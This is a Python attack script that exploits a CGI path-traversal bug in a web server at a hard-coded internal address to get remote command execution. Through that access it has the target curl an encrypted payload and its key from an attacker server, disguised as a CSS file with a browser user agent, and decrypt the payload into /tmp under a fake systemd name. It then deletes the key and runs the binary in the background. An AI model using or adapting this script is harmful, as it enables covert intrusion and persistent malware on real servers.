import requests
import subprocess
import os
import random
import string

# --- Configuration ---
target_ip = "10.37.1.248"
attacker_ip = "YOUR_SERVER_IP" 
local_binary = "./beachhead"

# Paths
traversal = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
target_url = f"http://{target_ip}{traversal}"
key_file_remote = "/tmp/.style"
final_binary = "/tmp/systemd-private-uptime"

session = requests.Session()

def prepare_local_payload():
    """Generates a key and encrypts the binary locally."""
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    
    with open("style.css", "w") as f:
        f.write(password)
        
    try:
        subprocess.run([
            "openssl", "enc", "-aes-256-cbc", "-md", "sha256", "-salt", "-pbkdf2",
            "-in", local_binary,
            "-out", "payload.enc",
            "-k", password
        ], check=True)
        print(f"[+] Encrypted {local_binary} -> payload.enc (Key: {password})")
        return True
    except Exception as e:
        print(f"[!] Local encryption failed: {e}")
        return False

def send_cmd(cmd):
    payload = f"echo Content-Type: text/plain; echo; {cmd}"
    try:
        req = requests.Request('POST', target_url, data=payload)
        prepared = req.prepare()
        prepared.url = target_url # Critical: bypasses normalization
        return session.send(prepared, timeout=10)
    except:
        return None

def deploy():
    if not prepare_local_payload():
        return

    print(f"[*] Deploying to {target_ip}...")

    # Step 1: Key Delivery
    # Mimicking a standard CSS fetch
    send_cmd(f"curl -s -A 'Mozilla/5.0' http://{attacker_ip}/style.css -o {key_file_remote}")
    
    # Step 2: Download & Decrypt
    # Using the exact flags supported by your target's OpenSSL
    decrypt_cmd = (
        f"curl -s -A 'Mozilla/5.0' http://{attacker_ip}/payload.enc | "
        f"openssl enc -d -aes-256-cbc -md sha256 -pbkdf2 -pass file:{key_file_remote} -out {final_binary}"
    )
    send_cmd(decrypt_cmd)
    
    # Step 3: Cleanup & Execution
    send_cmd(f"rm {key_file_remote}")
    send_cmd(f"chmod +x {final_binary}")

    # Verify and Run
    res = send_cmd(f"ls -l {final_binary}")
    if res and final_binary in res.text:
        print(f"[+] Deployment successful: {res.text.strip()}")
        send_cmd(f"nohup {final_binary} > /dev/null 2>&1 &")
    else:
        print("[!] File missing on target. Check web server logs or PrivateTmp.")

if __name__ == "__main__":
    deploy()